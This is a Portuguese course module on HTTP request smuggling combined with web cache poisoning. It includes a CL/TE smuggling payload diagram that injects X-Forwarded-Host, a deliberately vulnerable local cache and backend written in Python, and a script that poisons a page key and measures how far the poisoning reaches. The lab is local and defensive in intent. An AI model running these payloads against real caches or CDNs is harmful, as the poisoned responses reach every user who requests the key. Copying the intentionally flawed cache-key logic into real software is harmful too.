# Módulo 8 — Desync de Cache

**Carga:** 3 horas (1h teoria · 2h lab)
**Pré-requisitos:** Módulos 1 a 7

---

## Objetivos

1. Entender por que o **cache** é a camada de maior alcance.
2. Reconhecer a **chave do cache** como a divergência central.
3. Distinguir **cache poisoning** de **cache deception**.
4. Montar um lab com **cache na cadeia**.
5. Medir o **alcance** — a diferença entre atingir um e atingir todos.

---

## ⚠ Antes de começar

⚠ **A afirmação que organiza o módulo:**

> **As camadas anteriores atingiam quem viesse depois.** **O cache atinge **todos** — porque ele
> armazena a resposta ruim e a serve para quem pedir a mesma chave.**

⚠ **E é o que faz o alcance saltar:**

| Camada | Quem é atingido |
|---|---|
| Proxy ↔ backend | ⚠ **Quem vem depois na fila** |
| WAF ↔ backend | Quem vem depois |
| ⚠ **Cache** | ⚠⚠ **TODOS que pedirem a chave** |
| Client-side | ⚠ A vítima específica |

⚠ **A tese:**

> **O cache é uma implementação a mais — e ele discorda sobre o que é "a mesma requisição".** **E
> essa discordância multiplica o efeito de todas as outras.**

⚠ **A tabela das duas classes, e a distinção é obrigatória:**

| Classe | O que o cache armazena | O atacante consegue |
|---|---|---|
| **Cache poisoning** | ⚠ **A resposta dele, para todos** | ⚠⚠ **Envenenar** |
| **Cache deception** | ⚠ **A resposta privada de alguém** | ⚠ **Ler dado alheio** |
| **Desync de cache** | ⚠ Pela discordância de framing | ⚠ **Envenenar, com desync** |

⚠ **A linha do desync de cache é a deste módulo.** **Não é envenenamento por header refletido — é
envenenamento **pela discordância sobre o framing**.** **A resposta ruim fica associada a uma chave
que outra pessoa vai pedir.**

⚠ **E é a razão de ele ser o mais grave:** **a vítima não precisa estar na fila, nem visitar uma
página** — **ela precisa pedir a URL que o atacante envenenou.**

⚠ **A regra escrita:**

> **O desync de cache combina duas coisas:** **a discordância sobre o limite, e a discordância sobre
> a chave.** **E o efeito é permanente, até o cache expirar.**

---

## 8.1 A chave do cache

⚠ **A chave é o que o cache usa para decidir "isto é a mesma requisição".** **E cada implementação
a monta diferente.**

| Componente da chave | Entra? |
|---|---|
| O **path** | ⚠ Quase sempre |
| A **query string** | ⚠ Depende |
| O header **`Host`** | ⚠ Depende |
| Headers de **encoding** | ⚠ Às vezes |
| ⚠ **Headers desconhecidos (`X-`)** | ⚠⚠ **Quase nunca** |
| O **método** | Depende |

⚠ **A linha do `X-` é a origem clássica do cache poisoning.** **Um header que **não entra** na chave
mas **muda a resposta**** — **e o cache serve aquela resposta a todos que pedirem a mesma URL sem o
header.**

⚠ **A tabela do que é chave e o que é entrada:**

| Elemento | É chave? | ⚠ Muda a resposta? |
|---|---|---|
| Path | ✓ | ✓ |
| Query | Depende | ✓ |
| `Host` | Depende | ⚠ Depende |
| `X-Forwarded-Host` | ⚠ **Não** | ⚠⚠ **Sim** |
| `X-Forwarded-Scheme` | ⚠ Não | ⚠ Sim |
| Cookie | ⚠ Depende | ✓ |

⚠ **A linha do `X-Forwarded-Host` é a mais clássica.** **Ele não está na chave, e o backend o usa
para montar URLs** — **e o cache armazena a resposta com o host do atacante.**

⚠ **E como isso se combina com o desync:** **você não precisa de um header refletido.** **Você
precisa que a **posição** da requisição no stream faça o backend ver uma requisição diferente** —
**e o cache associar a resposta a uma chave pública.**

⚠ **A regra escrita:**

> **Duas discordâncias, e o efeito é o produto delas.** **Sobre o limite (o framing) e sobre a
> chave (o cache).** **Juntas, dão um envenenamento que não depende de header refletido.**

```bash
mkdir -p ~/smuggle-lab/mod08 && cd ~/smuggle-lab/mod08

echo "═══ 1. a chave do cache ═══"
echo
cat > chave.md <<'EOF'
# A chave do cache

## O que entra na chave
| Componente | Entra? |
|---|---|
| o PATH | quase sempre |
| a QUERY STRING | depende |
| o header Host | depende |
| headers de encoding | às vezes |
| ⚠ headers desconhecidos (X-) | ⚠⚠ quase NUNCA |
| o MÉTODO | depende |

## O que é chave × o que muda a resposta
| Elemento | É chave? | Muda a resposta? |
|---|---|---|
| Path | ✓ | ✓ |
| Query | depende | ✓ |
| Host | depende | depende |
| ⚠ X-Forwarded-Host | ⚠ NÃO | ⚠⚠ SIM |
| X-Forwarded-Scheme | não | sim |
| Cookie | depende | ✓ |

## ⚠ a linha clássica
`X-Forwarded-Host` NÃO está na chave —
e o backend o usa para montar URLs.
✓ e o cache armazena a resposta com o host DO ATACANTE.

## ⚠ e como isso combina com o desync
você NÃO precisa de header refletido.
você precisa que a POSIÇÃO no stream faça o backend
ver outra requisição — e o cache associar a resposta
a uma chave PÚBLICA.

## ⚠ A REGRA
duas discordâncias, e o efeito é o PRODUTO:
· sobre o LIMITE (framing)
· sobre a CHAVE (cache)
✓ juntas, dão um envenenamento sem header refletido.
EOF

cat chave.md

echo
echo "═══ 2. as duas classes ═══"
echo
cat <<'EXPL'
  ┌──────────────────────┬───────────────────────────┬────────────────────┐
  │ CLASSE               │ O CACHE ARMAZENA          │ O ATACANTE CONSEGUE│
  ├──────────────────────┼───────────────────────────┼────────────────────┤
  │ CACHE POISONING      │ a resposta DELE, p/ todos │ ⚠⚠ ENVENENAR        │
  │ CACHE DECEPTION      │ a resposta PRIVADA        │ ⚠ LER dado alheio   │
  │ ⚠ DESYNC DE CACHE    │ pela discordância de      │ ⚠ envenenar COM     │
  │                      │ FRAMING                   │   desync            │
  └──────────────────────┴───────────────────────────┴────────────────────┘

  ── E A DIFERENÇA DE ALCANCE ──
     · o poisoning atinge todos que pedirem a chave
     · ⚠ e não exige que a vítima esteja na fila
     · ⚠ nem que ela abra uma página
     ✓ ela só precisa PEDIR a URL envenenada.

  ── E O EFEITO É PERMANENTE ──
     ⚠ até o cache EXPIRAR.
     ✓ e o TTL pode ser horas, ou dias.
EXPL
```

⚠ **As três classes são o mapa do módulo.** **E a distinção entre elas é o que evita o relatório
errado:** **poisoning é sobre a **resposta**; deception é sobre a **privacidade**; o desync é sobre
o **framing**.**

⚠ **E a nota do TTL é o que faz a gravidade:** **o efeito persiste** — **e o atacante não precisa
estar lá quando a vítima chega.**

**Produza `chave.md`:**

| Elemento | É chave? | Muda a resposta? |
|---|---|---|
| `X-Forwarded-Host` | | |
| Path | | |
| Cookie | | |

**Responda:**

1. **Por que o `X-Forwarded-Host` é clássico?
2. **O que o desync acrescenta** ao poisoning?
3. **Cite as três classes.**
4. **Por que o efeito é permanente?**

---

## 8.2 O desync que envenena

⚠ **O mecanismo: a discordância de framing produz uma requisição que o cache associa a uma chave
pública.**

```
┌──────────────────────────────────────────────────────────────────────┐
│ 1. O ATACANTE MANDA A SEQUÊNCIA                                      │
│                                                                      │
│   POST /inofensivo HTTP/1.1\r\n                                      │
│   Content-Length: 120\r\n        ← ⚠ mente                            │
│   Transfer-Encoding: chunked\r\n                                     │
│   \r\n                                                               │
│   0\r\n\r\n                                                          │
│   GET /pagina-publica HTTP/1.1\r\n   ← ⚠ o pedido ESCOLHIDO           │
│   Host: alvo\r\n                                                     │
│   ⚠ X-Forwarded-Host: atacante\r\n   ← ⚠ o que envenena               │
│                                                                      │
├──────────────────────────────────────────────────────────────────────┤
│ 2. O FRONTEND E O CACHE VEEM UMA REQUISIÇÃO                          │
│    ⚠ o cache NÃO associa nada — ela não é cacheável, ou é o POST      │
├──────────────────────────────────────────────────────────────────────┤
│ 3. O BACKEND VÊ DUAS                                                 │
│    · a 1ª: POST /inofensivo (inútil)                                 │
│    · ⚠ a 2ª: GET /pagina-publica — COM o X-Forwarded-Host            │
│                                                                      │
├──────────────────────────────────────────────────────────────────────┤
│ 4. ⚠ E A RESPOSTA DA 2ª É ARMAZENADA                                 │
│    · sob a chave /pagina-publica                                     │
│    · ⚠ com o host do atacante no corpo                               │
│                                                                      │
├──────────────────────────────────────────────────────────────────────┤
│ 5. A VÍTIMA PEDE /pagina-publica                                     │
│    ⚠ e recebe a resposta ENVENENADA                                  │
│    ✓ ela não estava na fila. não abriu página nenhuma.                │
│      só pediu a URL.                                                 │
└──────────────────────────────────────────────────────────────────────┘
```

⚠ **O passo 4 é o que multiplica.** **E note que a vítima não precisa de nada além de pedir a URL** —
**e é por isso que o alcance é total.**

⚠ **A tabela do que o atacante escolhe:**

| Escolha | Por quê |
|---|---|
| O **path** da requisição escondida | ⚠ **É a chave que ele quer envenenar** |
| O **header** que muda a resposta | ⚠ O que o cache ignora |
| O **momento** | ⚠ Quando o cache não tem a chave |
| ⚠ **O payload** | ⚠ Que produz a segunda requisição |

⚠ **A linha do momento é a mais prática.** **Se o cache já tem a chave, o pedido do atacante
não a substitui** — **a menos que o cache seja burro, ou que a chave não exista ainda.** **É por
isso que o atacante escolhe uma URL **que ninguém pediu** — **e a envenena antes.**

⚠ **A regra escrita:**

> **O atacante escolhe a chave, o header e o momento.** **E o cache faz o resto** — **porque ele
> acredita que as duas requisições são a mesma.**

```bash
cd ~/smuggle-lab/mod08

echo "═══ 3. o desync que envenena ═══"
echo
cat > envenena.md <<'EOF'
# O desync que envenena

## O mecanismo, em 5 passos
| # | Passo | O que acontece |
|---|---|---|
| 1 | o atacante manda a sequência | TE+CL, com o pedido escondido |
| 2 | o frontend e o cache veem UMA | e ela não é cacheável |
| 3 | o backend vê DUAS | a 2ª com o header que envenena |
| 4 | ⚠ a resposta da 2ª é ARMAZENADA | sob a chave pública |
| 5 | ⚠ a vítima pede a URL | e recebe a resposta envenenada |

## ⚠ o passo 4 multiplica
e a vítima não precisa de NADA além de pedir a URL.
✓ é por isso que o alcance é TOTAL.

## O que o atacante ESCOLHE
| Escolha | Por quê |
|---|---|
| o PATH da requisição escondida | ⚠ é a CHAVE que ele quer envenenar |
| o HEADER que muda a resposta | o que o cache IGNORA |
| ⚠ o MOMENTO | quando o cache não tem a chave |
| o PAYLOAD | que produz a segunda requisição |

## ⚠ a linha do momento
se o cache JÁ TEM a chave, o pedido do atacante
não a substitui — a menos que o cache seja burro.
✓ por isso o atacante escolhe uma URL QUE NINGUÉM PEDIU.

## ⚠ A REGRA
o atacante escolhe a CHAVE, o HEADER e o MOMENTO.
e o cache faz o resto —
porque ele acredita que as duas requisições são a MESMA.
EOF

cat envenena.md

echo
echo "═══ 4. o cache didático, no lab ═══"
echo
cat <<'EXPL'
  ── O QUE O CACHE PRECISA FAZER ──

     1. montar a CHAVE — e ⚠ ignorar o X-Forwarded-Host
     2. guardar a resposta por um TTL
     3. ⚠ servir a resposta GUARDADA a quem pedir a chave

  ── O QUE ELE NÃO PODE FAZER (e é o bug) ──
     · ⚠ incluir o X-Forwarded-Host na chave → ele seria imune
     · ⚠ validar o framing → ele seria imune

  ── E O BACKEND PRECISA ──
     · usar o X-Forwarded-Host ⚠ na resposta
     ✓ é o que torna o envenenamento VISÍVEL

  ✓ e é o par clássico: o cache ignora o header,
     o backend o usa.
EXPL
```

⚠ **O cache didático é o instrumento.** **E ele implementa a divergência:** **ignora o
`X-Forwarded-Host` na chave, e o backend o usa na resposta.**

⚠ **E a nota "ele seria imune" é importante:** **um cache que inclui **todos** os headers na chave
elimina a classe** — **e é a defesa que o módulo 10 discute.**

**Produza `envenena.md`:**

| # | Passo | O que acontece |
|---|---|---|
| 1 | | |
| 4 | | |
| 5 | | |

**Responda:**

1. **O que o passo 4 multiplica?**
2. **O que a vítima precisa fazer?** Só isso?
3. **O que o atacante escolhe?** Cite quatro.
4. **Por que o momento importa?**

---

## 8.3 Medindo o alcance

⚠ **A medição tem uma dimensão nova: **quantas pessoas** o envenenamento atinge.**

| Medição | Como | ⚠ Sinal |
|---|---|---|
| **A chave envenenada?** | Pedir a URL depois | ⚠ Resposta alterada |
| **Sem o header?** | Pedir sem o `X-` | ⚠ Idem |
| **De outra "sessão"?** | ⚠ **Sem cookie** | ⚠ Idem |
| **Quanto dura?** | Pedir após o TTL | Expirou? |

⚠ **A terceira linha é a que prova o **alcance público**.** **Se a resposta envenenada chega a um
cliente **sem os headers do atacante**, o envenenamento é para todos** — **e não só para ele.**

⚠ **E a tabela do que cada resultado significa:**

| Resultado | Significa |
|---|---|
| A resposta mudou, **com** o header | ⚠ Ainda é só reflexo |
| ⚠ **Mudou SEM o header** | ⚠⚠ **Envenenamento público** |
| Mudou para outro path também | A chave é mais larga que o esperado |
| Não mudou | Sem efeito, ou não cacheável |

⚠ **A segunda linha é a que caracteriza o cache poisoning.** **A primeira é só um header refletido** —
**e não é bug de cache.**

⚠ **A regra escrita:**

> **A prova do envenenamento é a resposta alterada chegar a quem NÃO mandou nada.** **Se precisa do
> header, não é envenenamento — é reflexo.**

```bash
cd ~/smuggle-lab/mod08

echo "═══ 5. medindo o alcance ═══"
echo
cat > alcance.md <<'EOF'
# Medindo o alcance

## As quatro medições
| Medição | Como | Sinal |
|---|---|---|
| a chave foi envenenada? | pedir a URL depois | resposta alterada |
| ⚠ SEM o header? | pedir sem o X- | ⚠ é a prova |
| de outra "sessão"? | sem cookie | idem |
| quanto dura? | pedir após o TTL | expirou? |

## O que cada resultado significa
| Resultado | Significa |
|---|---|
| mudou, COM o header | ⚠ ainda é só REFLEXO |
| ⚠ mudou SEM o header | ⚠⚠ ENVENENAMENTO PÚBLICO |
| mudou para outro path | a chave é mais larga |
| não mudou | sem efeito, ou não cacheável |

## ⚠ a linha que caracteriza
a resposta alterada chegar a quem NÃO MANDOU NADA.
se precisa do header, não é envenenamento — é REFLEXO.

## ⚠ A REGRA
a prova do envenenamento é o ALCANCE.
não a mudança na SUA resposta.
EOF

cat alcance.md

echo
echo "═══ 6. o cache didático ═══"
echo
cat > cache_didatico.py <<'PY'
#!/usr/bin/env python3
"""
cache_didatico.py — um cache que IGNORA o X-Forwarded-Host na chave.

⚠ DIDÁTICO e LOCAL (127.0.0.1).
   ele demonstra a divergência: o cache ignora o header,
   o backend o usa.
⚠ nunca aponte isto para um serviço de terceiro.
"""
import socket, sys, threading, os, time
from urllib.parse import urlsplit

HOST, PORT = "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 8200
BACKEND = ("127.0.0.1", int(sys.argv[2]) if len(sys.argv) > 2 else 8080)
TTL = 60
LOG = os.path.expanduser("~/smuggle-lab/evidencia/cache.log")

# ⚠ A CHAVE: só o PATH. o X-Forwarded-Host NÃO entra.
CACHE: dict = {}
_lock = threading.Lock()


def chave_do_cache(cabecalho: str) -> str:
    """⚠ monta a chave — e IGNORA os headers X-"""
    primeira = cabecalho.split("\r\n")[0]
    path = primeira.split(" ")[1] if len(primeira.split(" ")) > 1 else "/"
    return urlsplit(path).path        # ⚠ só o path, sem query, sem header


def atende(cli):
    try:
        dados = b""
        while b"\r\n\r\n" not in dados:
            b = cli.recv(1)
            if not b: return
            dados += b
        fim = dados.index(b"\r\n\r\n") + 4
        cab = dados[:fim].decode(errors="replace")

        # ── lê o corpo por CL (a regra do cache) ──
        cl = 0
        for l in cab.split("\r\n"):
            if l.lower().startswith("content-length:"):
                try: cl = int(l.split(":", 1)[1].strip())
                except ValueError: cl = 0
        corpo = dados[fim:]
        while len(corpo) < cl:
            b = cli.recv(cl - len(corpo))
            if not b: break
            corpo += b

        chave = chave_do_cache(cab)
        agora = time.time()

        with _lock:
            guardado = CACHE.get(chave)

        if guardado and (agora - guardado["t"]) < TTL:
            print(f"  [cache] ⚠ HIT em {chave} — servindo o GUARDADO", flush=True)
            with open(LOG, "a") as f:
                f.write(f"\n═══ CACHE HIT ═══\nCHAVE: {chave}\n"
                        f"⚠ serviu o guardado (idade {agora-guardado['t']:.0f}s)\n")
            cli.sendall(guardado["resp"])
            cli.close(); return

        # ── MISS: vai ao backend ──
        print(f"  [cache] MISS em {chave} — indo ao backend", flush=True)
        with socket.create_connection(BACKEND, timeout=3) as be:
            be.sendall(cab.encode() + corpo)
            be.settimeout(3)
            resp = b""
            try:
                while True:
                    d = be.recv(4096)
                    if not d: break
                    resp += d
            except socket.timeout:
                pass

        if b"200" in resp[:20]:
            with _lock:
                CACHE[chave] = {"resp": resp, "t": agora}
            print(f"  [cache] ⚠ ARMAZENOU {chave} por {TTL}s", flush=True)
            with open(LOG, "a") as f:
                f.write(f"\n═══ CACHE MISS + ARMAZENOU ═══\nCHAVE: {chave}\n"
                        f"⚠ a resposta ficou guardada sob esta chave\n")

        cli.sendall(resp)
        cli.close()
    except Exception:
        try: cli.close()
        except Exception: pass


def main():
    os.makedirs(os.path.dirname(LOG), exist_ok=True)
    open(LOG, "w").close()
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT)); s.listen(5)
    print(f"═══ CACHE DIDÁTICO em {HOST}:{PORT} → {BACKEND} ═══")
    print(f"  chave: ⚠ SÓ O PATH (ignora X-Forwarded-Host)")
    print(f"  TTL  : {TTL}s")
    print(f"  log  : {LOG}")
    print("  ⚠ local, didático. nunca aponte para terceiro.")
    print()
    while True:
        cli, _ = s.accept()
        threading.Thread(target=atende, args=(cli,), daemon=True).start()


if __name__ == "__main__":
    main()
PY

chmod +x cache_didatico.py

echo "  ── o cache está pronto ──"
echo
echo "  ── e o backend que USA o X-Forwarded-Host ──"
cat > backend_host.py <<'PY'
#!/usr/bin/env python3
"""
backend_host.py — usa o X-Forwarded-Host na RESPOSTA.

⚠ é o par do cache didático: o cache ignora o header,
   o backend o usa.
⚠ DIDÁTICO e LOCAL.
"""
import socket, sys, threading, os

HOST, PORT = "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 8080
LOG = os.path.expanduser("~/smuggle-lab/evidencia/backend-host.log")
_c, _lock = 0, threading.Lock()


def atende(cli):
    global _c
    try:
        while True:
            dados = b""
            while b"\r\n\r\n" not in dados:
                b = cli.recv(1)
                if not b: return
                dados += b
            fim = dados.index(b"\r\n\r\n") + 4
            cab = dados[:fim].decode(errors="replace")
            linhas = cab.split("\r\n")
            primeira = linhas[0]
            path = primeira.split(" ")[1] if len(primeira.split(" ")) > 1 else "/"

            # ⚠ USA o X-Forwarded-Host
            xfh = ""
            for l in linhas:
                if l.lower().startswith("x-forwarded-host:"):
                    xfh = l.split(":", 1)[1].strip()

            cl = 0
            for l in linhas:
                if l.lower().startswith("content-length:"):
                    try: cl = int(l.split(":", 1)[1].strip())
                    except ValueError: cl = 0
            corpo = dados[fim:]
            while len(corpo) < cl:
                b = cli.recv(cl - len(corpo))
                if not b: break
                corpo += b

            with _lock:
                _c += 1
                n = _c

            # ⚠ A RESPOSTA — com o host que veio no header
            corpo_resp = (f"pagina {path} — host={xfh or 'nenhum'}").encode()

            with open(LOG, "a") as f:
                f.write(f"\n═══ requisição #{n} ═══\nPATH: {path}\n"
                        f"⚠ X-Forwarded-Host: {xfh or '(nenhum)'}\n"
                        f"RESPOSTA: {corpo_resp.decode()}\n")

            print(f"  [backend #{n}] {path[:30]}  ⚠ host='{xfh or 'nenhum'}'", flush=True)

            cli.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n"
                        b"Content-Length: " + str(len(corpo_resp)).encode()
                        + b"\r\nCache-Control: public, max-age=60\r\n"
                        + b"Connection: keep-alive\r\n\r\n" + corpo_resp)
    except Exception:
        pass
    finally:
        try: cli.close()
        except Exception: pass


def main():
    os.makedirs(os.path.dirname(LOG), exist_ok=True)
    open(LOG, "w").close()
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT)); s.listen(5)
    print(f"═══ BACKEND em {HOST}:{PORT} ═══")
    print(f"  log: {LOG}")
    print("  ⚠ USA o X-Forwarded-Host na resposta")
    print("  ⚠ local, didático.")
    print()
    while True:
        cli, _ = s.accept()
        threading.Thread(target=atende, args=(cli,), daemon=True).start()


if __name__ == "__main__":
    main()
PY

chmod +x backend_host.py

echo "  ── o par está pronto ──"
ls -1 cache_didatico.py backend_host.py | sed 's/^/     /'
echo
echo "  ── PARA RODAR ──"
cat <<'EXPL'
     python3 ~/smuggle-lab/mod08/backend_host.py 8080
     python3 ~/smuggle-lab/mod08/cache_didatico.py 8200 8080
EXPL
```

⚠ **O par é o instrumento.** **O cache ignora o header na chave; o backend o usa na resposta** — **e
é entre os dois que o envenenamento vive.**

⚠ **E a nota `Cache-Control: public, max-age=60` no backend é o que torna a resposta **cacheável** —
**e sem ela não haveria envenenamento.**

**Produza `cache-didatico.md`:**

| Componente | O que faz |
|---|---|
| Cache | |
| Backend | |
| Chave | |

**Responda:**

1. **O que o cache usa como chave?** O que ele ignora?
2. **O que o backend usa?**
3. **Por que o `Cache-Control: public` importa?**
4. **O que tornaria o cache imune?**

---

## 8.4 LAB — O envenenamento medido

**Duração:** 120 min

### Passo 1 — Suba a cadeia (35 min)

```bash
cd ~/smuggle-lab/mod08

echo "═══ SUBINDO ═══"
echo
cat <<'EXPL'
  ── QUATRO TERMINAIS ──

     1. o backend   → 127.0.0.1:8080   (usa o X-Forwarded-Host)
     2. o cache     → 127.0.0.1:8200   (ignora o header na chave)
     3. os logs     → cache.log e backend-host.log
     4. o medidor

  ── ⚠ O ISOLAMENTO ──
     tudo em 127.0.0.1. nenhuma saída.
EXPL

cat > evidencia/lab-cache.md <<'EOF'
# O lab com cache

## A cadeia
| Camada | Endereço | ⚠ Regra |
|---|---|---|
| cache | 127.0.0.1:8200 | chave = SÓ o path |
| backend | 127.0.0.1:8080 | USA o X-Forwarded-Host |

## O isolamento
| Item | Valor |
|---|---|
| endereços | 127.0.0.1 |
| rede de saída | ⚠ NENHUMA |
| teste que falha | [ ] feito |

## A chave do cache
| Item | Entra na chave? |
|---|---|
| path | ✓ |
| query | ⚠ não (a minha) |
| X-Forwarded-Host | ⚠ **NÃO** |
| cookie | ⚠ não |

## O TTL
| Item | Valor |
|---|---|
| TTL | 60s |
| o que acontece depois | a chave expira |
EOF

cat evidencia/lab-cache.md
```

**Produza `lab-cache.md`:**

| Camada | Endereço | Regra |
|---|---|---|
| Cache | | |
| Backend | | |

**Responda:**

1. **O que entra na chave do seu cache?
2. **O que o backend usa?
3. **O TTL é quanto?
4. **O isolamento passou?**

### Passo 2 — Envenene e meça o alcance (55 min)

⚠ **O passo que mede o alcance é o que caracteriza o achado.**

```bash
cd ~/smuggle-lab/mod08

echo "═══ ENVENENANDO E MEDINDO ═══"
echo
cat > mede-cache.py <<'PY'
#!/usr/bin/env python3
"""
mede-cache.py — mede o ALCANCE do envenenamento.

⚠ o que caracteriza o cache poisoning:
   a resposta alterada chegar a quem NÃO mandou nada.

⚠ DIDÁTICO e LOCAL (127.0.0.1).
"""
import socket, sys, os

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8200


def pede(path: str, headers: dict | None = None) -> str:
    h = "".join(f"{k}: {v}\r\n" for k, v in (headers or {}).items())
    req = f"GET {path} HTTP/1.1\r\nHost: localhost\r\n{h}\r\n".encode()
    try:
        with socket.create_connection((HOST, PORT), timeout=5) as s:
            s.sendall(req)
            s.settimeout(3)
            r = b""
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
                    r += d
            except socket.timeout:
                pass
        return r.split(b"\r\n\r\n", 1)[1].decode(errors="replace").strip()
    except Exception as e:
        return f"({type(e).__name__})"


def main():
    ALVO = "/pagina-publica"
    HOST_ATACANTE = "atacante.example"

    print("═══ MEDINDO O ALCANCE DO ENVENENAMENTO ═══")
    print()
    print(f"  cache: {HOST}:{PORT}   ⚠ LOCAL")
    print(f"  chave: {ALVO}")
    print()

    # ── 1. estado inicial ──
    print("  1. estado inicial (antes do ataque):")
    r0 = pede(ALVO)
    print(f"     {r0!r}")
    print()

    # ── 2. o ataque: pedir COM o header ──
    #    ⚠ num caso real, isto viria da requisição escondida do desync.
    print("  2. o ataque — pedindo COM o header:")
    r1 = pede(ALVO, {"X-Forwarded-Host": HOST_ATACANTE})
    print(f"     {r1!r}")
    print()

    # ── 3. ⚠ A PROVA: pedir SEM o header ──
    print("  3. ⚠ A PROVA — pedindo SEM o header:")
    r2 = pede(ALVO)
    print(f"     {r2!r}")
    print()

    # ── 4. e de "outra sessão" ──
    print("  4. de outra sessão (sem cookie):")
    r3 = pede(ALVO, {"User-Agent": "outro-cliente"})
    print(f"     {r3!r}")
    print()

    # ── O VEREDITO ──
    print("  ═══ O VEREDITO ═══")
    if HOST_ATACANTE in r2:
        print("  ⚠⚠ ENVENENAMENTO PÚBLICO")
        print(f"     a resposta SEM o header contém '{HOST_ATACANTE}'.")
        print("     → a chave está envenenada. é o cache poisoning.")
    elif HOST_ATACANTE in r1 and HOST_ATACANTE not in r2:
        print("  · REFLEXO apenas")
        print("     a resposta com o header contém o valor,")
        print("     e a SEM o header NÃO. → não há envenenamento.")
    else:
        print("  · sem efeito — ou a resposta não é cacheável")
    print()
    print("  ⚠ tudo local. nenhum serviço de terceiro.")


if __name__ == "__main__":
    main()
PY

chmod +x mede-cache.py
echo "  ── pronto ──"
echo "     python3 ~/smuggle-lab/mod08/mede-cache.py 8200"

cat > caderno/PD-008.md <<'EOF'
# PD-008 — envenenamento de cache

**Data:** ____

## 1. A cadeia
| Camada | Endereço | Regra |
|---|---|---|
| cache | | |
| backend | | |

## 2. A chave do cache
| Item | Entra? |
|---|---|
| path | |
| query | |
| ⚠ X-Forwarded-Host | |

## 3. As medições
| # | O que pedi | Resposta | ⚠ Contém o host do atacante? |
|---|---|---|---|
| 1 | sem header (inicial) | | |
| 2 | COM o header | | |
| 3 | ⚠ SEM o header | | |
| 4 | de outra sessão | | |

## 4. ⚠ O VEREDITO
| Item | Valor |
|---|---|
| envenenamento público? | sim / reflexo / sem efeito |
| por quê | |

## 5. O invariante
| Item | Valor |
|---|---|
| "o cache serve o que o backend produziu para ESTA chave" | |
| ⚠ como foi violado | |

## 6. A evidência literal
```
[cache.log]
```
```
[backend-host.log]
```

## 7. ⚠ O que eu NÃO fiz
- [ ] não apontei para serviço de terceiro
- [ ] não testei CDN de produção
- [ ] não envenenei cache de ninguém
- [ ] não publiquei

## 8. O que NÃO foi verificado
⚠ mínimo 3
EOF

cat caderno/PD-008.md | head -30
```

⚠ **A medição 3 é a que caracteriza.** **E a nota é explícita:** **se a resposta **sem** o header
contém o valor do atacante, é envenenamento; se só a **com** o header, é reflexo.**

⚠ **E a medição 4 é a que mede o **alcance público**:** **sem cookie, sem nada do atacante** — **e
ainda assim recebe a resposta ruim.**

**Produza `envenenamento-medido.md`:**

| # | O que pedi | Contém o host? |
|---|---|---|
| 1 | Inicial | |
| 2 | Com header | |
| 3 | Sem header | |
| 4 | Outra sessão | |

**Responda:**

1. **Houve envenenamento público?** Ou só reflexo?
2. **Qual medição caracteriza?** Por quê?
3. **Quanto dura** o envenenamento? (o TTL)
4. **Qual o invariante violado?**

### Passo 3 — Documente (30 min)

Produza `relatorio-cache.md`:

```markdown
# Relatório — desync de cache

## 1. A cadeia
| Camada | Produto | Versão | Endereço |
|---|---|---|---|
| cache | | | 127.0.0.1:____ |
| backend | | | 127.0.0.1:____ |

## 2. A configuração (literal)
```
[a chave do cache, e o TTL]
```

## 3. O isolamento
| Item | Valor |
|---|---|
| ⚠ terceiros | NENHUM |
| teste que falha | [ ] feito |

## 4. A chave
| Elemento | Entra na chave? |
|---|---|
| path | |
| query | |
| ⚠ X-Forwarded-Host | ⚠ **NÃO** |
| cookie | |

## 5. A medida
| # | Pedido | Resposta | ⚠ Ctx |
|---|---|---|---|
| | | | |

## 6. ⚠ A prova do ENVENENAMENTO
```
o pedido SEM o header
```
```
a resposta — com o valor do "atacante"
```

## 7. O alcance
| Item | Valor |
|---|---|
| exige o header? | ⚠ **NÃO** |
| exige sessão? | NÃO |
| ⚠ exige o quê? | ⚠ **só pedir a chave** |
| dura quanto | TTL = ____ |

## 8. O invariante violado
| Item | Valor |
|---|---|
| o invariante | |
| como foi violado | |

## 9. A classificação e o destino
| Item | Valor |
|---|---|
| categoria (Parser Differentials, módulo 3) | |
| ⚠ destinatários | o CACHE e o BACKEND — separadamente |

## 10. ⚠ O que eu NÃO fiz
- [ ] não apontei para CDN, cache ou host de terceiro
- [ ] não testei serviço público
- [ ] não envenenei cache de ninguém
- [ ] não publiquei
- [ ] não calculei severidade

## 11. O que NÃO foi verificado
⚠ mínimo 3

## 12. O que cada mantenedor confirma
| # | Dono | Item |
|---|---|---|
| 1 | o cache | por que o X-Forwarded-Host não entra na chave? |
| 2 | o backend | por que usa o header na resposta? |
```

**Produza `relatorio-cache.md`:**

| Item | Valor |
|---|---|
| Envenenamento? | |
| Alcance | |
| Destinatários | |
| **O que não fiz** | |

**Responda:**

1. **O alcance está registrado?** O que a vítima precisa fazer?
2. **Quantos destinatários** o achado tem?
3. **O que cada um confirma?**
4. **O "não fiz" está completo?**

### Critérios de aceitação

- `chave.md` com os **seis** componentes da chave e o que muda a resposta.
- Você explicou **por que o `X-Forwarded-Host` é clássico**.
- Você explicou **como o desync se combina** com a chave.
- Você explicou **as duas discordâncias** e por que o efeito é o produto.
- `envenena.md` com os **cinco** passos.
- Você explicou **o que o passo 4 multiplica**.
- Você explicou **o que a vítima precisa fazer** — e por que é só isso.
- Você citou as **quatro** escolhas do atacante.
- `alcance.md` com as **quatro** medições.
- Você explicou **qual medição caracteriza** o envenenamento.
- Você explicou **por que reflexo não é envenenamento**.
- O **cache didático** e o **backend** subindo, em 127.0.0.1.
- A **chave do cache** declarada (só o path).
- O **envenenamento medido**, com as quatro medições.
- Você mediu o **alcance** — e respondeu se exige o header.
- `caderno/PD-008.md` com as **oito** seções.
- Você escreveu **o invariante violado**.
- `relatorio-cache.md` com as **doze** seções.
- Você identificou **os dois destinatários** e o que cada um confirma.
- ⚠ **Nenhum CDN ou serviço de terceiro.**

---

## Avaliação

1. **Por que o cache é a camada de maior alcance?**
2. **O que a vítima precisa fazer?**
3. **Cite as três classes** de ataque a cache.
4. **O que distingue poisoning de deception?**
5. **Por que o efeito é permanente?**
6. **Cite seis componentes** e se entram na chave.
